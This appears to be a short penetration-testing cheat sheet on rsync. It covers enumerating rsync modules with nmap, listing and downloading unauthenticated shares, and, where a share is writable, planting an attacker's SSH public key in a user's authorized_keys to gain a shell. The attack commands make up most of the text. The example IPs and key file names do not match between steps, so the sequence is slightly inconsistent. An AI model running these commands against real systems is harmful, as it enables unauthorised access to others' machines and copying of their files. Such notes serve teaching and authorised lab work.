# Enumeration 

## Enumeration of shared folders

* An rsync module is essentially a directory share. These modules can optionally be protected by a password. This options lists the available modules and, optionally, determines if the module requires a password to access:
```bash
nmap -sV --script "rsync-list-modules" -p <PORT> <IP>
```

Manual Rsync

* Once you have the list of modules you have a few different options depending on the actions you want to take and whether or not authentication is required. If authentication is not required you can list a shared folder:
```bash
rsync -av --list-only rsync://192.168.0.123/shared_name
```

* And copy all files to your local machine via the following command:
```bash
rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared
```

If you can write to the shares follow the next commands

#
```
#Create a ssh key
ssh-keygen -f id_rsa
```

```
#create .ssh folder in teh rsyn_shared you downloaded
mkdir .ssh

#copy the public to the authorized_keys ( you have to create that file)
cp id_rsa.pub .ssh/authorized_keys


#transfer .ssh to target
rsync -r ./.ssh 192.168.122.126::fox/

#then ssh into user
ssh -i newkey fox@192.168.85.126
```



